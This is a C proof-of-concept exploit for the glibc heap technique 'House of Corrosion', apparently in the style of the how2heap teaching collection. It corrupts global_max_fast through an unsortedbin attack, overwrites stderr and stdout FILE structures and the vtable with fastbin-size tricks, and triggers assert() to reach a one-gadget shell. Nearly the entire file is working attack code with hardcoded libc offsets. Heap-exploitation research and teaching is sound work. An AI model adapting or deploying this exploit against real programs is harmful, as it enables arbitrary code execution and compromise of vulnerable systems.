// House of Corrosion : PoC in the format of how2heap
// Even though DEBUG is defined, this exploit has some uncertainity due to the libc load addr's entropy

#include<stdio.h>
#include<unistd.h>
#include<stdlib.h>
#include<string.h>
#include<assert.h>

#define ull unsigned long long
#define DEBUG 0
#define WAIT while(fgetc(stdin)!='\n');

//A and tmp1 should be the same except for LSByte
#define GET_CLOSE_CHUNK(A,B,tmp1,tmp2,sz,LSB_A,padd_size) \
  malloc(padd_size);\
  tmp1 = malloc(0x50);\
  A = malloc(0x20);\
  B = malloc(0x20);\
  tmp2 = malloc(0x50);\
  assert(((unsigned long)tmp1&0xff)<((unsigned long)A&0xff) && ((unsigned long)tmp1&0xff)<0xa0);\
  free(tmp1);\
  free(tmp2);\
  ((char*)tmp2)[0] = LSB_A;\
  tmp2 = malloc(0x50);\
  tmp1 = malloc(0x50);\
  printf("[-]tmp1: %p\n",tmp1);\
  printf("[-]tmp2: %p\n",tmp2);\
  tmp1[1] = (sz+0x10)|1;\
  tmp1[6] = 0;\
  tmp1[7] = (sz+0x10)|1;\
  printf("[-]A: %p\n",A);\
  printf("[-]B: %p\n",B);

#define ADV2(chunk,value,size) \
  free(chunk);\
  chunk[0] = value;\
  malloc(size);

#define ADV2_WITH_CHANGE(chunk, value, size, value_size)\
  free(chunk);\
  if(value_size == 0x2) ((short*)chunk)[0] = value;\
  else {printf("ERROR\n"); exit(0);}\
  chunk = malloc(size);

#define ADV3(chunkA, chunkB, tmp, LSB_A, size_DST, size_SRC, tamper_flight_flag, tamper_value)\
  free(chunkB);\
  free(chunkA);\
  ((char*)chunkA)[0] = LSB_A;\
  chunkA = malloc(size_DST); \
  tmp[1] = (0x10 + size_SRC)|1; \
  free(chunkA); \
  tmp[1] = (0x10 + size_DST)|1; /* to avoid corruption detection */\
  if(tamper_flight_flag==1) ((short*)chunkA)[0] = tamper_value;\
  chunkA = malloc(size_DST);

//This 3 variables must be set (have the same 4-bit entropy)
void *LSBs_gmf = 0xc940; //global_max_fast: 4nibble目は適当
void *LSBs_IO_str_jumps = 0x7360-0x20; // -0x20 is NEEDED to call _IO_str_overflow instead of xsputn
void *LSBs_call_rax = 0xc610;; // this must be nearby default_morecore

void *off_gmf_libcbase = 0x3ed940;
void *off_stdout_libcbase = 0x3ec760;
void *off_arena_libcbase = 0x3ebc40;
ull off_fastbinY_stderr = 0xa28;

unsigned size_formula(unsigned long delta){
  return (unsigned)(delta*2 + 0x20);
}

int main(int argc, char *argv[])
{
  WAIT

  // Calc and get some addrs
  char num;
  void *addr_stdout = stdout;
  void *libcbase = addr_stdout - off_stdout_libcbase;
  ull *addr_IO_file_jumps = 0x3e82a0 + (ull)libcbase;
  void *addr_gmf = (ull)off_gmf_libcbase + (ull)libcbase;
  void *addr_main_arena = (ull)libcbase + (ull)off_arena_libcbase;
  ull *addr_IO_str_overflow = (ull)libcbase + 0x8ff60;
  ull addr_IO_str_jumps = (ull)libcbase + 0x3e8360;
  ull addr_call_rax = (ull)libcbase + 0x8d610;
  void *addr_fastbinY = (ull)addr_main_arena + 0x60;
  ull *A1,*B1,*A2,*B2,*tmp11,*tmp21,*temp12,*tmp22,*padd, *chunk_fake_size;
  ull *dumped_main_arena_end_chunk, *pedantic_chunk;
  ull *stderr_mode_chunk, *stderr_flags_chunk, *stderr_IO_buf_base_chunk, *stderr_IO_write_ptr_chunk, *stderr_s_alloc_chunk, *stderr_vtable_chunk;
  ull *stdout_mode_chunk;
  ull temp;
  ull *temp_ptrs[10];
  unsigned sz1=size_formula(off_fastbinY_stderr+0x60);
  unsigned size_dumped_main_arena_end = size_formula(0x1ce0); //WHY 8??
  unsigned size_stderr_flags = size_formula(0xa30) - 0x8;
  unsigned size_stderr_mode = size_formula(0xa30+0xc0) - 0x8;
  unsigned size_stderr_IO_buf_base = size_formula(0xa30+0x38 - 0x8);
  unsigned size_stderr_IO_write_ptr = size_formula(0xa30+0x28 - 0x8);
  unsigned size_stderr_IO_buf_end = size_formula(0xa30+0x30 + 0x8);
  unsigned size_stderr_vtable = size_formula(0xa30+0xd8 - 0x8);
  unsigned size_stderr_s_alloc = size_formula(0xa30+0xe0 - 0x8);
  unsigned size_stdout_mode = size_formula(0xb10 + 0xc0 - 0x8);
  unsigned size_morecore = size_formula(0x888-0x8); //WHY 8??
  ull *onegadget = 0x00021b95;
  unsigned off_default_morecore_onegadget = 0x4becb;
  printf("House of Corrosion : PoC\n");
  printf("___________________________________\n\n");
  printf("__LIBC INFO__\n");
  printf("libcbase : %p\n",libcbase); 
  printf("mainarena: %p\n",addr_main_arena);
  printf("fastbinsY: %p\n",addr_fastbinY);
  printf("global_max_fast: %p\n",addr_gmf);
  printf("call rax: %p\n",addr_call_rax);
  printf("___________________________________\n\n");

  // Alloc some chunks 
  printf("* Preparing for some chunks ...*\n");
  ull *a = malloc(0x450); //for unsortedbin attack targeting at global_max_fast
  ull *padding = malloc(0x20);
  ull *largebin = malloc(0x450); //for largebin chunk with NON_MAINARENA which would cause assert() later
  ull *avoid_consolidation = malloc(0x110-0x30);

  // Prepare for Advantage 3
  /* LSB SENSITIVE !!! */
  GET_CLOSE_CHUNK(A1,B1,tmp11,tmp21,size_stderr_IO_buf_end,0x50,0x90);
  GET_CLOSE_CHUNK(A2,B2,tmp21,tmp22,size_stderr_s_alloc,0x90,0x0);

  chunk_fake_size = malloc(sz1 + 0x100); //make fake size for fake fastbin's next chunk
  for(int ix=0;ix!=(sz1+0x100)/0x10;++ix){
    *(chunk_fake_size+0+ix*2) = 0x0;
    *(chunk_fake_size+1+ix*2) = 0x30|1;
  }

  //Malloc chunks for Advantage2
  dumped_main_arena_end_chunk = malloc(size_dumped_main_arena_end);
  pedantic_chunk = malloc(size_formula(0x1cf8)-0x8);
  stderr_mode_chunk = malloc(size_stderr_mode);
  stderr_flags_chunk = malloc(size_stderr_flags);
  stderr_IO_write_ptr_chunk = malloc(size_stderr_IO_write_ptr);
  stderr_IO_buf_base_chunk = malloc(size_stderr_IO_buf_base);
  stderr_vtable_chunk = malloc(size_stderr_vtable);
  stdout_mode_chunk = malloc(size_stdout_mode);
  printf("[*]DONE\n");

  //Connect to largebin with NON_MAINARENA 1
  printf("\n* Connecting to largebin...*\n");
  free(largebin);
  malloc(0x500);
  ((ull*)(((ull)largebin)-0x10))[0] = 0;
  ((ull*)(((ull)largebin)-0x10))[1] = 0x460|0b101; //set NON_MAIN_ARENA
  printf("[*]DONE\n");

  //Unsortedbin Attack
  printf("\n* Doing unsortedbin attack agains global_max_fast...*\n");
  free(a);

  a[0] = 0xfffff; //victim->fd
#ifndef DEBUG
  for(int ix=0;ix!=2;++ix){ //victim->bk
    temp = (unsigned long long)LSBs_gmf >> (8*ix);
    num = temp % 0x100;
    if(ix==0)
      num -= 0x10;
    *(char*)((unsigned long long)a+8+ix) = num;
  }
#else
  for(int ix=0;ix!=8;++ix){ //libcの情報からgmfを計算しているため100%正確な位置に書き込める。 いちいちデバッグでbrute-forceめんどいから
    temp = (unsigned long long)addr_gmf >> (8*ix);
    num = temp % 0x100;
    if(ix==0)
      num -= 0x10;
    *(char*)((unsigned long long)a+8+ix) = num;
  }

  //calculate the 100% accurate LSbytes
  LSBs_IO_str_jumps = (addr_IO_str_jumps-0x20)&0xffff;
  LSBs_call_rax = addr_call_rax&0xffff;
#endif

  malloc(0x450); //unsorted attack!! 
  
  //Check whether the unsorted attack is success or not
  if(*((ull*)addr_gmf) != (ull)addr_main_arena + 96){
    printf("\n\n[-]FAIL: unsortedbin attack\n");
    exit(0);
  }else{
    printf("[!]SUCCESS: unsortedbin attack\n");
  }
  

  // Make unsortedbin's bk VALID
  printf("\n* Make unsortedbin's bk VALID...*\n");
  ADV2(dumped_main_arena_end_chunk, 0x450+0x10, size_dumped_main_arena_end); //size
  free(pedantic_chunk); //fd/bk
  printf("dumped_main_arena_end: 0x%016llx 0x%016llx\n",*((ull*)((ull)addr_gmf-0x10)),*((ull*)((ull)addr_gmf-0x8)));
  printf("global_max_fast      : 0x%016llx 0x%016llx\n",*(ull*)addr_gmf, *((ull*)((ull)addr_gmf+0x8)));

  // Overwrite vtable and so on
  printf("\n* Overwriting some addrs...*\n");
  printf("HOWEVER, I can't speak from now on due to the corruption.\n");
  printf("Wish you can get shell, bye.\n\n");
  ADV2(stderr_mode_chunk, 0x1, size_stderr_mode);
  ADV2(stdout_mode_chunk, 0x1, size_stdout_mode);
  ADV2(stderr_flags_chunk, 0x0, size_stderr_flags);
  ADV2(stderr_IO_write_ptr_chunk, 0x7fffffffffffffff, size_stderr_IO_write_ptr);
  ADV2(stderr_IO_buf_base_chunk, off_default_morecore_onegadget, size_stderr_IO_buf_base);


  // Transplant __morecore's value to stderr->file._IO_buf_end
  ADV3(A1,B1,tmp11,0x50,size_stderr_IO_buf_end,size_morecore,0,0);
  tmp11[1] = (size_morecore+0x10)|1;// morecoreにdefault_morecoreの値を戻しておく
  A1 = malloc(size_morecore); 

  // Write LSByte of _IO_str_jumps on stderr->vtable  
  ADV2_WITH_CHANGE(stderr_vtable_chunk, LSBs_IO_str_jumps, size_stderr_vtable, sizeof(short));
  
  // Transplant __morecore's value to _s._allocate_buffer
  ADV3(A2,B2,tmp21,0x90,size_stderr_s_alloc,size_morecore,1,LSBs_call_rax);

  //Trigger assert()
  malloc(0x50);

  printf("You won't reach here. Can you get a shell??");

  return 0;
}
